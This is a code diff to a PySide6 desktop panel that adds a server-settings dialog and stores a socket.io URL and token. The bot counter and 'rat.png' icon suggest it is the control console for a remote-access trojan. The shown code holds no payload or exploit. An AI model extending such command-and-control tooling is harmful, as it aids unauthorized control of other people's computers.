@@ -1,5 +1,5 @@
-from PySide6.QtCore import Qt,QModelIndex,QTimer,QUrl
-from PySide6.QtWidgets import QApplication, QMainWindow,QMessageBox,QTableView,QMenu,QLabel,QWidget
+from PySide6.QtCore import Qt,QModelIndex,QTimer,QUrl,QSettings
+from PySide6.QtWidgets import QApplication, QDialog, QMainWindow,QMessageBox,QTableView,QMenu,QLabel,QWidget
 from PySide6.QtGui import QIcon,QAction,QColor
 from core.info import PATTAYA_PANEL_VERSION
 from core.util import PattayaPanelUtil
@@ -8,7 +8,7 @@ from model.bot_table_model import BotTableModel
 import qdarktheme
 import psutil
 from widget.about_pattaya import AboutPattayaWidget
-
+from widget.server_setting import PattayaServerSetting
 
 
 class MainWindow(QMainWindow, Ui_MainWindow):
@@ -22,6 +22,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.update_title = self.old_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(0))
         self.setWindowTitle(self.update_title)
         self.setMaximumSize(16777215, 16777215)
+        self.settings = QSettings("unknownclub.net", "Pattaya")
 
         self.about_dialog = AboutPattayaWidget()
         self.about_dialog.setWindowModality(Qt.WindowModality.ApplicationModal)
@@ -88,6 +89,11 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         self.server_log_text_browser.setStyleSheet("background-color: #000000;")
 
 
+        self.pattaya_server_setting = PattayaServerSetting()
+        self.actionServer_setting.triggered.connect(self.pattaya_setting)
+        self.pattaya_server_setting.setWindowIcon(QIcon(":/assets/images/rat.png"))
+
+
     def app_exit(self):
         self.app.exit()
 
@@ -128,7 +134,18 @@ class MainWindow(QMainWindow, Ui_MainWindow):
 
 
     def start(self):
-        self.socket_io_client.start()
+        # get current values for settings
+        url = self.settings.value("url")
+        token = self.settings.value("token")
+
+        if url == None or token == None:
+            PattayaPanelUtil.panel_log_error(f'Pattaya socket.io server configuration not found in system')
+            QMessageBox.warning(self, 
+            "Pattaya Panel Alert",
+            "Not found Pattaya server setting, Please check your server setting",
+            QMessageBox.Ok)
+        else:
+            self.socket_io_client.start(url, token, "/")
         
 
 
@@ -153,3 +170,17 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         ramPercent = psutil.virtual_memory().percent
         self.cpuLabel.setText("CPU usage: {}%".format(cpuPercent))
         self.ramLabel.setText("RAM usage: {}%".format(ramPercent))
+
+
+    def pattaya_setting(self):
+        ret = self.pattaya_server_setting.exec()
+        if(ret == QDialog.Accepted):
+            PattayaPanelUtil.panel_log_info(f'Pattaya socket.io server configuration saved!')
+            self.settings.setValue("url", self.pattaya_server_setting.url)
+            self.settings.setValue("token", self.pattaya_server_setting.token)
+            QMessageBox.information(self, 
+            "Pattaya server setting",
+            "Setting Saved!",
+            QMessageBox.Ok)
+        else:
+            PattayaPanelUtil.panel_log_error(f'Ignore Pattaya server configuration')
